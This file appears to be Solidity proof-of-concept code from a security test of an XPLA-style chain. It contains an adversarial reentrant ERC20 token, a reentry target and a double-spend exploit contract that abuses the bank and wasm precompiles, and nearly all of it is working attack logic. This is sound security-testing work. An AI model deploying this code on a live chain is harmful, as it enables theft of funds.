// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Coin} from "cosmos-evm-contracts/precompiles/common/Types.sol";
import {IBank, BANK_PRECOMPILE_ADDRESS} from "../xpla/bank/IBank.sol";
import {IWasm, WASM_PRECOMPILE_ADDRESS} from "../xpla/wasm/IWasm.sol";

contract PoCToken is ERC20 {
    constructor(uint256 supply) ERC20("PoC Token", "POC") {
        _mint(msg.sender, supply);
    }
}

contract AdversarialXerc20 is ERC20 {
    address public callbackTarget;
    bytes public callbackData;
    bool public catchCallbackRevert;
    uint256 public burnIterations;
    bytes32 public burnAccumulator;

    bool private callbackEntered;

    event TransferProbe(
        uint256 gasAtEntry,
        address indexed operator,
        address indexed from,
        address to,
        uint256 amount
    );
    event PoisonLog(bytes32 indexed marker);
    event CallbackResult(bool success, bytes returnData);

    constructor(uint256 supply) ERC20("Adversarial Token", "ADV") {
        _mint(msg.sender, supply);
    }

    function configureCallback(
        address target,
        bytes calldata data,
        bool catchRevert,
        uint256 iterations
    ) external {
        callbackTarget = target;
        callbackData = data;
        catchCallbackRevert = catchRevert;
        burnIterations = iterations;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        super._beforeTokenTransfer(from, to, amount);

        if (from == address(0) || callbackEntered) {
            return;
        }

        emit TransferProbe(gasleft(), msg.sender, from, to, amount);

        bytes32 accumulator = burnAccumulator;
        for (uint256 i = 0; i < burnIterations; i++) {
            accumulator = keccak256(abi.encodePacked(accumulator, i));
        }
        burnAccumulator = accumulator;

        if (callbackTarget == address(0)) {
            return;
        }

        callbackEntered = true;
        emit PoisonLog(keccak256("adversarial callback"));
        (bool success, bytes memory returnData) = callbackTarget.call(
            callbackData
        );
        callbackEntered = false;

        if (!success && !catchCallbackRevert) {
            assembly {
                revert(add(returnData, 0x20), mload(returnData))
            }
        }

        emit CallbackResult(success, returnData);
    }
}

contract Xerc20ReentryTarget {
    IBank private constant BANK = IBank(BANK_PRECOMPILE_ADDRESS);

    error AdversarialCallbackRevert();

    IERC20 public immutable token;
    string public denom;
    address public recipient;
    uint256 public amount;
    bool public revertAfterCallback;

    event CallbackEntered(uint256 gasLeft);
    event ReentryCompleted(bool success);

    constructor(IERC20 token_, string memory denom_) {
        token = token_;
        denom = denom_;
    }

    function configure(
        address recipient_,
        uint256 amount_,
        bool revertAfterCallback_
    ) external {
        recipient = recipient_;
        amount = amount_;
        revertAfterCallback = revertAfterCallback_;
    }

    function onXerc20Transfer() external {
        require(msg.sender == address(token), "only token");
        emit CallbackEntered(gasleft());

        if (amount != 0) {
            Coin[] memory coins = new Coin[](1);
            coins[0] = Coin({denom: denom, amount: amount});
            bool success = BANK.send(address(this), recipient, coins);
            emit ReentryCompleted(success);
        }

        if (revertAfterCallback) {
            revert AdversarialCallbackRevert();
        }
    }
}

contract BankXerc20DoubleSpendPoC {
    IBank private constant BANK = IBank(BANK_PRECOMPILE_ADDRESS);
    IWasm private constant WASM = IWasm(WASM_PRECOMPILE_ADDRESS);
    address private constant WASM_DELEGATE_PRECOMPILE_ADDRESS =
        0x1000000000000000000000000000000000000044;

    error ForcedOuterRevertAfterWasm(bytes32 marker);

    bytes32 public constant WASM_EXECUTION_COMPLETED_MARKER =
        keccak256("wasm execution completed");

    IERC20 public immutable token;
    string public denom;

    event WasmFundsGasProbe(uint256 gasBeforeCall, uint256 gasAfterCall);
    event WasmFundsCallResult(bool success, bytes returnData);

    constructor(IERC20 token_, string memory denom_) {
        token = token_;
        denom = denom_;
    }

    receive() external payable {}

    function exploit(
        address bankRecipient,
        address directRecipient,
        uint256 amount
    ) external {
        require(token.balanceOf(address(this)) >= amount, "insufficient seed");

        Coin[] memory coins = new Coin[](1);
        coins[0] = Coin({denom: denom, amount: amount});

        require(
            BANK.send(address(this), bankRecipient, coins),
            "bank send failed"
        );
        require(token.transfer(directRecipient, amount), "transfer failed");
    }

    function exploitViaWasmFunds(
        address wasmContract,
        bytes calldata wasmMsg,
        address directRecipient,
        uint256 amount
    ) external {
        require(token.balanceOf(address(this)) >= amount, "insufficient seed");

        Coin[] memory funds = new Coin[](1);
        funds[0] = Coin({denom: denom, amount: amount});

        WASM.executeContract(address(this), wasmContract, wasmMsg, funds);
        require(token.transfer(directRecipient, amount), "transfer failed");
    }

    function executeWasmFunds(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 amount
    ) external returns (bytes memory) {
        Coin[] memory funds = new Coin[](1);
        funds[0] = Coin({denom: denom, amount: amount});

        uint256 gasBeforeCall = gasleft();
        bytes memory result = WASM.executeContract(
            address(this),
            wasmContract,
            wasmMsg,
            funds
        );
        emit WasmFundsGasProbe(gasBeforeCall, gasleft());

        return result;
    }

    function tryExecuteWasmFunds(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 amount
    ) external returns (bool success, bytes memory returnData) {
        Coin[] memory funds = new Coin[](1);
        funds[0] = Coin({denom: denom, amount: amount});

        uint256 gasBeforeCall = gasleft();
        (success, returnData) = WASM_PRECOMPILE_ADDRESS.call(
            abi.encodeCall(
                IWasm.executeContract,
                (address(this), wasmContract, wasmMsg, funds)
            )
        );
        emit WasmFundsGasProbe(gasBeforeCall, gasleft());
        emit WasmFundsCallResult(success, returnData);
    }

    function executeWasmFundsThenRevert(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 amount
    ) external returns (bytes memory) {
        require(msg.sender == address(this), "only self");

        Coin[] memory funds = new Coin[](1);
        funds[0] = Coin({denom: denom, amount: amount});

        WASM.executeContract(address(this), wasmContract, wasmMsg, funds);
        revert ForcedOuterRevertAfterWasm(WASM_EXECUTION_COMPLETED_MARKER);
    }

    function tryExecuteWasmFundsThenRevert(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 amount
    ) external returns (bool success, bytes memory returnData) {
        (success, returnData) = address(this).call(
            abi.encodeCall(
                this.executeWasmFundsThenRevert,
                (wasmContract, wasmMsg, amount)
            )
        );
        emit WasmFundsCallResult(success, returnData);
    }

    function executeDelegateWasmFunds(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 amount
    ) external {
        _executeDelegateWasmFunds(wasmContract, wasmMsg, amount);
    }

    function executeDelegateWasmFundsThenRevert(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 amount
    ) external {
        require(msg.sender == address(this), "only self");

        _executeDelegateWasmFunds(wasmContract, wasmMsg, amount);
        revert ForcedOuterRevertAfterWasm(WASM_EXECUTION_COMPLETED_MARKER);
    }

    function _executeDelegateWasmFunds(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 amount
    ) internal {
        Coin[] memory funds = new Coin[](1);
        funds[0] = Coin({denom: denom, amount: amount});

        (bool success, bytes memory returnData) = WASM_DELEGATE_PRECOMPILE_ADDRESS
            .call(
                abi.encodeCall(
                    IWasm.executeContract,
                    (tx.origin, wasmContract, wasmMsg, funds)
                )
            );
        if (!success) {
            assembly {
                revert(add(returnData, 0x20), mload(returnData))
            }
        }
    }

    function tryExecuteDelegateWasmFundsThenRevert(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 amount
    ) external returns (bool success, bytes memory returnData) {
        (success, returnData) = address(this).call(
            abi.encodeCall(
                this.executeDelegateWasmFundsThenRevert,
                (wasmContract, wasmMsg, amount)
            )
        );
        emit WasmFundsCallResult(success, returnData);
    }

    function executeWasmNativeFundsAndAssertBalance(
        address wasmContract,
        bytes calldata wasmMsg,
        uint256 nativeAmount
    ) external {
        uint256 senderBalanceBefore = address(this).balance;
        uint256 wasmBalanceBefore = wasmContract.balance;
        require(
            senderBalanceBefore >= nativeAmount,
            "insufficient native seed"
        );

        Coin[] memory funds = new Coin[](1);
        funds[0] = Coin({denom: "axpla", amount: nativeAmount});

        WASM.executeContract(address(this), wasmContract, wasmMsg, funds);

        require(
            address(this).balance == senderBalanceBefore - nativeAmount,
            "native sender balance not updated"
        );
        require(
            wasmContract.balance == wasmBalanceBefore + nativeAmount,
            "native wasm balance not updated"
        );
    }
}
